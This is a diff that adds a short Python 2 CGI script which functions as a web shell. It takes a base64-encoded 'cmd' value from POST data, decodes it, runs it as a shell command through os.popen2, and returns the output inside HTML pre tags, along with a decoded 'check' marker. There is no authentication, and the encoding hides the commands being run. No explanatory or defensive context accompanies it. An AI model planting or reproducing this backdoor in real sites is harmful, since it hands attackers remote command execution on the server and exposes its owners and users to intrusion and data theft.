@@ -1,0 +1,18 @@
+#!/usr/bin/python
+try:
+	import cgitb; cgitb.enable()
+except:
+	pass
+import os,cgi,base64
+form = cgi.FieldStorage(environ={'REQUEST_METHOD':'POST'})
+cmd = form.getvalue('cmd')
+check = form.getvalue('check')
+print "Content-type:text/html\r\n\r\n"
+if cmd:
+	print base64.b64decode(check)+"<pre>"
+	child_stdin, child_stdout = os.popen2(base64.b64decode(cmd))
+	child_stdin.close()
+	result = child_stdout.read()
+	child_stdout.close()
+	print result.strip()
+	print "</pre>"
